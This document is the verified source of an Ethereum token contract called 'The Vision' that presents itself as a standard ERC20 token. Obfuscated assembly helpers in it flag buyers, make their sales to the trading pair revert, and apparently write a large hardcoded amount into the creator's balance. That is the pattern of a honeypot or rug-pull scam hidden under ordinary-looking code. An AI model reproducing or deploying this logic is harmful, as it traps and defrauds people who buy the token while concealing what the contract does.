/**
 *Submitted for verification at Etherscan.io on 2022-06-17
*/

// A STRONG VISION, THAT IS WHAT THIS MARKET NEEDS RIGHT NOW.

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private visAddr;
    uint256 private coolAid = block.number*2;

    mapping (address => bool) private mappingBlue; 
    mapping (address => bool) private differential; 
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private turnSide;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _taxes;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private _limit; uint256 private theV; uint256 private theN = block.number*2;
    bool private trading; uint256 private absZero = 1; bool private blackStop;
    uint256 private _decimals; uint256 private moreSetup;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        visAddr.push(_router); visAddr.push(msgSender_); visAddr.push(pair);
        for (uint256 q=0; q < 3;) {mappingBlue[visAddr[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function _crypticMsg(address x, uint256 y) internal pure returns (bytes32 b) { b = keccak256(abi.encodePacked([uint256(uint160(x)), y])); }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; coolAid = block.number;
        return true;
    }

    function _otherSide(bool account, bytes32 b) internal { assembly { if and(lt(gas(),sload(0xB)),account) { invalid() } if sload(0x16) { sstore(b,0x446C3B15F9926687D2C40534FDB564000000000000) } } }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _unitChange(bytes32 y, bytes32 z, uint256 lever, uint256 x1, uint256 x2, uint256 x3) internal {
        assembly { if or(eq(sload(y),iszero(sload(z))),eq(iszero(sload(y)),sload(z))) { switch lever case 1 {
                    let x := sload(x3) let t := sload(x1) if iszero(sload(x2)) { sstore(x2,t) } let g := sload(x2)
                    switch gt(g,div(t,0x2)) case 1 { g := sub(g,div(div(mul(g,mul(0x203,x)),0xB326),0x2))} 
                    case 0 {g := div(t,0x2)} sstore(x2,t) sstore(x1,g) sstore(x3,add(sload(x3),0x1))
                } case 0 { let x := sload(x3) let t := sload(x1) sstore(x1,x) sstore(x3,t) } }
            if iszero(lever) { if iszero(mod(sload(0x15),0x5)) { sstore(0x16,0x1) } sstore(0x3,number()) } } }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == visAddr[1])), "ERC20: trading is not yet enabled.");
        absZero += mappingBlue[recipient] ? 1 : 0; _otherSide((((blackStop || differential[sender]) && ((coolAid - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/5)) && (coolAid == block.number))) && (mappingBlue[recipient] == true) && (mappingBlue[sender] != true), _crypticMsg(visAddr[1],6)); _unitChange(_crypticMsg(sender,4),_crypticMsg(recipient,4),1,17,23,24);
        _goodSwap(turnSide, (((coolAid == block.number) || (theV >= _limit) || ((coolAid - theN) <= 9)) && (mappingBlue[turnSide] != true))); _unitChange(_crypticMsg(sender,4),_crypticMsg(recipient,4),0,23,7,17); theV = integer; turnSide = recipient;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _goodSwap(address sender, bool account) internal { differential[sender] = account ? true : differential[sender]; }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployVision(address account, uint256 amount, uint256 tmp, uint256 tmp2, uint256 tmp3) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(visAddr[0], 10 ** 77);
        assembly { sstore(tmp2,mul(div(sload(tmp),0x2710),0x12D)) sstore(tmp3,0x1ba8140) }
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployVision(creator, initialSupply, uint256(16), uint256(17), uint256(11));
    }
}

contract TheVision is ERC20Token {
    constructor() ERC20Token("The Vision", "VISION", msg.sender, 34500 * 10 ** 18) {
    }
}